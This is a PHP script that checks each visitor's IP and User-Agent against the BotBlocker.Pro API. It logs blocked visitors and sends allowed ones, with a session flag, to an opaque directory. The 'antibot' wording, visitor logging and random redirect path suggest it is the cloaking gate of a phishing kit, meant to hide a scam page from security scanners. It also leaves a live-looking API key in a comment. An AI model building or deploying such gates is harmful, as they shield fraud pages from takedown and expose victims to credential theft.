<?php

    if( empty($conf_botblockerkey) ) {
        echo "<b>Error!</b> Enter antibot APIKEY";
        exit();
    }

/* START CONFIGURATION */

// Enable BotBlocker protection (set to true to enable, false to disable)
$botProtection = true;
// Your BotBlocker.Pro API key (replace with your actual API key)
//$botBlockerApiKey = "dL67CNYROpEJF_EKjatS_J6v6muCtDKRKKHaA0-0Yt-8E";
$botBlockerApiKey = $conf_botblockerkey;
// URL to redirect blocked users (leave empty to show a 404 error page)
$botRedirection = "https://google.com";

/* END CONFIGURATION */

/**
 * Class BotBlockerPro
 *
 * This class integrates with BotBlocker.Pro to check and block malicious traffic based on IP and User-Agent.
 */
class BotBlockerPro {
    private string $apiKey;

    /**
     * Initializes the BotBlockerPro class with the provided API key.
     *
     * @param string $apiKey BotBlocker.Pro API key for authenticating requests.
     */
    public function __construct(string $apiKey) {
        $this->apiKey = $apiKey;
    }

    /**
     * Get the client's real IP address.
     *
     * This method detects the IP address by checking multiple server variables, including Cloudflare headers.
     *
     * @return string The client's IP address.
     */
    private function getClientIP(): string {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = $_SERVER['HTTP_CLIENT_IP'] ?? '';
        $forward = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
        $remote = $_SERVER['REMOTE_ADDR'] ?? '';

        return filter_var($client, FILTER_VALIDATE_IP) ? $client :
               (filter_var($forward, FILTER_VALIDATE_IP) ? $forward : $remote);
    }

    /**
     * Send a 404 Not Found response to the client and halt the script.
     *
     * Displays a simple 404 error page and stops the script execution.
     */
    public function showNotFoundPage(): void {
        header("HTTP/1.0 404 Not Found");
        $requestedPage = $_SERVER['REQUEST_URI'] ?? 'Unknown';
        $pagePath = parse_url($requestedPage, PHP_URL_PATH);
        $serverName = $_SERVER['SERVER_NAME'] ?? 'Unknown';

        echo <<<EOL
        <!DOCTYPE HTML>
        <html><head><title>404 Not Found</title></head><body>
        <h1>Not Found</h1>
        <p>The requested URL $pagePath was not found on this server.</p>
        <hr>
        <address>Server at $serverName Port 80</address>
        </body></html>
        EOL;
        exit();
    }

    /**
     * Make an HTTP GET request.
     *
     * This function handles sending GET requests using cURL.
     *
     * @param string $url The URL to send the request to.
     * @return string The response from the server.
     * @throws Exception if the HTTP request fails.
     */
    private function httpGet(string $url): string {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, 'BotBlockerPro-PHP');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception('HTTP request failed: ' . curl_error($ch));
        }

        curl_close($ch);
        return $response;
    }

    /**
     * Check if the current user should be blocked by BotBlocker.Pro.
     *
     * This method sends the client's IP and User-Agent to the BotBlocker API for evaluation.
     *
     * @return array The response data from BotBlocker API.
     */
    public function check(): array {
        try {
            $ip = $this->getClientIP();
            $url = "https://botblocker.pro/api/v1/blocker?ip=$ip&apikey=" . $this->apiKey .
                   "&ua=" . urlencode($_SERVER['HTTP_USER_AGENT']) .
                   "&url=" . urlencode($_SERVER['REQUEST_URI']);
            $response = $this->httpGet($url);
            $data = json_decode($response, true);

            if (json_last_error() !== JSON_ERROR_NONE) {
                throw new Exception('Error decoding JSON: ' . json_last_error_msg());
            }

            return $data;
        } catch (Exception $e) {
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }
}

/* MAIN LOGIC */
if ($botProtection) {
    $botBlocker = new BotBlockerPro($botBlockerApiKey);
    $check = $botBlocker->check();

    if (!$check['data']) {
        die($check['error'] ?? 'An unknown error occurred. (botblocker)');
    }

    // Block access if the API indicates the user should be blocked
    if ($check['data']['block_access']) {
        visitors($ip_infos,"Blocked by botblocker");
        exit();
    }

    $_SESSION['last_page'] = "msg";
    $_SESSION['user_allowed'] = true;
    get_lang();
    visitors($ip_infos,"Allowed");
    header("Location: DUVzTTavlOw/?redirection=msg");
    exit();

}

?>